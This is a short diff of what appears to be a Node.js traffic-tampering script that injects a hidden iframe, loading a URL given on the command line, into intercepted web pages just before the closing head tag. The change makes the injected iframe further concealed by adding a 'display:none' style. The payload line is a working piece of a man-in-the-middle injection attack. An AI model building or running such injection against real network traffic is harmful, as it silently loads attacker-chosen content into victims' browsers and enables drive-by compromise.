@@ -33,5 +33,5 @@ if (process.argv[2] == undefined) {
 
   url  = process.argv[2];
   console.log("Injecting " + url + " while tampering HTTP traffic");
-  payload = '<iframe src="' + url + '" width=0 height=0><\/iframe><\/head>'
+  payload = '<iframe src="' + url + '" width=0 height=0 style="display:none;"><\/iframe><\/head>'
 }
